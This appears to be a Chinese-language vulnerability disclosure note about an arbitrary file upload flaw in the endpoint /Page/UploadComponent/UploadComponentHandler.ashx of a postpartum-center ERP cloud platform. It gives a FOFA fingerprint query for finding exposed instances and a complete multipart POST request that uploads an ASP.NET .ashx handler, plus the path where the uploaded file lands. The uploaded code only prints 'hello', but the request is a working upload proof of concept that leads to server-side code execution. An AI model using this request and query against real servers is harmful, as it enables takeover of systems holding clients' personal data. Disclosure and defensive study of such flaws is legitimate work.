# 月子会所ERP管理云平台UploadComponent任意文件上传漏洞

# 一、漏洞简介
月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，可上传任意文件，攻击者可利用该漏洞获取服务器控制权。

# 二、影响版本
+ 月子会所ERP管理云平台

# 三、资产测绘
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面

![1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab.png](./img/gY9C_r2Y0iYGY2BO/1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab-072945.png)

# 四、漏洞复现
```plain
POST /Page/UploadComponent/UploadComponentHandler.ashx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 481
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--
```

![1693185672475-3ec6cca2-4d1a-4ca1-bb1a-511929b82e4a.png](./img/gY9C_r2Y0iYGY2BO/1693185672475-3ec6cca2-4d1a-4ca1-bb1a-511929b82e4a-206384.png)

上传文件位置

```plain
http://xx.xx.xx.xx/UploadBaseFolder/ERP/202308/1_230828092026228129.ashx
```

![1693185711006-d52a0121-dbfa-4151-91a9-8a68a5ca3edb.png](./img/gY9C_r2Y0iYGY2BO/1693185711006-d52a0121-dbfa-4151-91a9-8a68a5ca3edb-460244.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kwthyxdkdkmqfpfc>